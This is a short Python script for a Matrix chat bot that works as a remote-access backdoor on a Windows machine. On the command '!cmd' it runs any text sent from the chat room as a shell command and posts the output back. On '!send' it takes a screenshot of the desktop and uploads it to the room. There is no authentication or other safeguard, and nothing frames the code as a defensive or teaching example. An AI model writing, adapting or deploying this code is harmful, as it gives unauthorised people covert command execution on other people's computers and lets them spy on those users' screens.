import os
import subprocess
import simplematrixbotlib as botlib
from mss import mss

creds = botlib.Creds(
    homeserver="https://matrix.org",
    username="@jesuslovesnipples:matrix.org",
    access_token=os.environ.get("MATRIX_TOKEN", "your_token_here")
)

bot = botlib.Bot(creds)
IMG_PATH = r"C:\Users\Public\screenshot.png"

@bot.listener.on_message_event
async def handle_commands(room, message):
    match = botlib.MessageMatch(room, message, bot)
    if not match.is_not_from_this_bot():
        return

    if match.command("send"):
        with mss() as sct:
            sct.shot(mon=1, output=IMG_PATH)
        if os.path.exists(IMG_PATH):
            await bot.api.send_image_message(room.room_id, IMG_PATH)
        else:
            await bot.api.send_text_message(room.room_id, "Screenshot failed.")

    elif match.command("cmd"):
        cmd = " ".join(match.args())
        if not cmd:
            await bot.api.send_text_message(room.room_id, "Usage: !cmd <command>")
            return
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=15)
            await bot.api.send_text_message(room.room_id, f"```\n{output[:3000]}\n```")
        except subprocess.TimeoutExpired:
            await bot.api.send_text_message(room.room_id, "Command timed out.")
        except subprocess.CalledProcessError as e:
            await bot.api.send_text_message(room.room_id, f"```\n{e.output[:3000]}\n```")
        except Exception as e:
            await bot.api.send_text_message(room.room_id, f"Error: {e}")

if __name__ == "__main__":
    bot.run()
